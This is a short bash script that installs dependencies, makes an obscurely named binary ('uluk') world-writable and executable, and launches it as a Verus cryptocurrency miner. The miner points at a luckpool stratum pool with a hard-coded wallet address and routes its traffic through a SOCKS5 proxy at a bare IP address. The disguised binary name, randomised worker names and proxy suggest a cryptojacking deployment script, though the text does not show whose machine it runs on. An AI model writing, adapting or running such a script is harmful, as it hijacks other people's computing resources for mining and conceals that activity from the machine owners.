#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
PROXY=socks5://181.3.14.202:1080
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
